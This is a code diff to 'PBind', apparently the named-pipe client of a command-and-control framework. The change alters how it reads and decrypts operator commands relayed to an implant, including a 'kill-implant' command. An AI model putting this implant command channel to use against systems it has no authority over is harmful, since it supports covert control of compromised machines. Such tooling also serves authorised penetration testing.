@@ -13,6 +13,7 @@ public static class PBind
     private static volatile StreamWriter _pipeWriter;
     private static string _encryptionKey = "";
     private static readonly object LOCK = new object();
+    private static bool _alreadyWaitingForCommand;
 
     public static void Main(string[] args)
     {
@@ -140,7 +141,8 @@ public static class PBind
         {
             try
             {
-                var clientInfo = Encryption.Decrypt(encryptionKey, _pipeReader.ReadLine());
+                var clientInfo = Encoding.UTF8.GetString(Encryption.Decrypt(encryptionKey, _pipeReader.ReadLine()));
+
                 if (!clientInfo.StartsWith("PBind-Connected"))
                 {
                     Console.WriteLine($"[PBind Client][-] Error - decrypted response on pipe connect was invalid: {clientInfo}");
@@ -170,38 +172,47 @@ public static class PBind
             _pipeReader.Dispose();
             _pipeWriter.Dispose();
             _pipeStream.Dispose();
-            return;
         }
 
         lock (LOCK)
         {
             try
             {
-                var line = _pipeReader.ReadLine();
-
-                while (string.IsNullOrWhiteSpace(line))
+                string line;
+                string response;
+                if (!_alreadyWaitingForCommand)
                 {
                     line = _pipeReader.ReadLine();
+
+                    while (string.IsNullOrWhiteSpace(line))
+                    {
+                        line = _pipeReader.ReadLine();
+                    }
+#if DEBUG
+                    Utils.TrimmedPrint("[PBind Client][*] Got encrypted base64 encoded response: ", line);
+#endif
+
+                    response = Encoding.UTF8.GetString(Encryption.Decrypt(_encryptionKey, line)).TrimEnd('\0');
+#if DEBUG
+                    Utils.TrimmedPrint("[PBind Client][*] Decrypted response from pipe: ", response);
+#endif
+                    if (response != "COMMAND")
+                    {
+#if DEBUG
+                        Utils.TrimmedPrint("[PBind Client][-] Error, received unexpected response on pipe: ", response);
+#endif
+                        throw new Exception("0x1001");
+                    }
+#if DEBUG
+                    Utils.TrimmedPrint("[PBind Client][*] Issuing command: ", command);
+#endif
                 }
-
-#if DEBUG
-                Utils.TrimmedPrint("[PBind Client][*] Got encrypted base64 encoded response: ", line);
-#endif
-
-                var response = Encryption.Decrypt(_encryptionKey, line);
-#if DEBUG
-                Utils.TrimmedPrint("[PBind Client][*] Decrypted response from pipe: ", response);
-#endif
-                if (response != "COMMAND")
+                else
                 {
 #if DEBUG
-                    Utils.TrimmedPrint("[PBind Client][-] Error, received unexpected response on pipe: ", response);
+                    Utils.TrimmedPrint("[PBind Client][*] Pipe already waiting for command, skipping read...");
 #endif
-                    throw new Exception("0x1001");
                 }
-#if DEBUG
-                Utils.TrimmedPrint("[PBind Client][*] Issuing command: ", command);
-#endif
 
                 if (command == "kill-implant")
                 {
@@ -221,14 +232,19 @@ public static class PBind
                     Console.WriteLine("[PBind Client][-] Got empty response");
 #endif
                     Console.WriteLine();
-                    return;
                 }
 #if DEBUG
                 Utils.TrimmedPrint("[PBind Client][*] Got encrypted encoded response: ", line);
 #endif
-                response = Encryption.Decrypt(_encryptionKey, line);
+                response = Encoding.UTF8.GetString(Encryption.Decrypt(_encryptionKey, line));
+
+                if (response.TrimEnd('\0') == "COMMAND")
+                {
+                    Console.WriteLine("");
+                }
 
                 Console.WriteLine(response);
+                _alreadyWaitingForCommand = true;
             }
             catch (Exception e)
             {
